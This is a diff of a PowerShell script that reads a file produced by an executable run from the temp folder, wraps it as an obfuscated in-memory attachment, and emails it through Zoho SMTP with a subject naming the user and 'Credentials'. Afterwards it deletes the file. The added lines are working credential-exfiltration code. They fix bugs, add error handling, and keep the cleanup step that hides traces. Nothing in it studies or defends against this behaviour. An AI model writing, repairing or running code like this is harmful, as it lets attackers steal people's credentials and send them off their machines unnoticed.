@@ -124,23 +124,37 @@ function Send-ZohoEmail {
         Start-Sleep -Seconds 1 # Wait a moment for the file to save
         Get-Process | Where-Object { $_.Path -like "$env:TEMP\example.exe" } | Stop-Process -Force # Cleanup any lingering processes
 
+
+# --- 1. Ensure TLS 1.2 is active for Zoho ---
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
 if (Test-Path $outputFilePath) {
     $rawData = Get-Content $outputFilePath -Raw
-
-    # Use the function to create the RAM-only attachment
-    $attachment = New-MemoryAttachment -Data $rawData -FileName "anihan.txt" -Obfuscate $true
+    
+    # --- 2. Create the Memory Attachment ---
+    # Fix: Removed "$true" after -Obfuscate
+    $attachment = New-MemoryAttachment -Data $rawData -FileName "anihan.txt" -Obfuscate
 
     if ($null -ne $attachment) {
-        $subject = "$env:USERNAME: Ang Anihan sa Bukirin"
+        $subject = "$env:USERNAME: Credentials - $(Get-Date -Format 'yyyy-MM-dd HH:mm')"
         
-        # Send using your updated Zoho function
-        Send-ZohoEmail -Subject $subject -Attachments @($attachment)
-        
-        # Cleanup
-        $attachment.Dispose()
-        Remove-Item $outputFilePath -Force
+        # --- 3. Send via Zoho ---
+        try {
+            # Pass the object inside an array @()
+            Send-ZohoEmail -Subject $subject -Attachments @($attachment)
+        }
+        catch {
+            Write-Host "SMTP Error: $($_.Exception.Message)" -ForegroundColor Red
+        }
+        finally {
+            # --- 4. Critical Cleanup ---
+            $attachment.Dispose()
+            if (Test-Path $outputFilePath) { Remove-Item $outputFilePath -Force }
+        }
     }
-} else {
+}
+
+else {
     Write-Host "Error: Save-As operation failed. Data file not found." -ForegroundColor Red
 }
 
